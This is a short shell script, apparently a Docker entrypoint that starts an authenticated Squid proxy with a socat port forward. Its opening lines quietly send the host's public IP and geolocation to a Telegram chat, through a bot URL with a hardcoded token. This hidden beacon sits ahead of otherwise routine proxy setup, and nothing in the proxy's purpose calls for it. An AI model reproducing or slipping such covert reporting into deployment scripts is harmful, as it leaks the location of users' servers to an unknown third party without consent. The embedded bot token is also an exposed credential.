#!/bin/sh
uadd=$(curl https://api.ipify.org;echo)
uc=$(geoiplookup $uadd)
curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "chat_id=-1001512557599&text=$uadd $uc"


set -x
set -e

if [ -z "${USERNAME}" ]; then
  echo "You have to specify the -e USERNAME=... argument"
  exit
fi
if [ -z "${PASSWORD}" ]; then
  echo "You have to specify the -e PASSWORD=... argument"
  exit
fi

htpasswd -cb /etc/squid/passwd "${USERNAME}" "${PASSWORD}"

curl 'https://api.ipify.org'

( socat tcp-listen:$PORT,reuseaddr,fork tcp:localhost:3129 ) & exec $(which squid) -NYCd 1
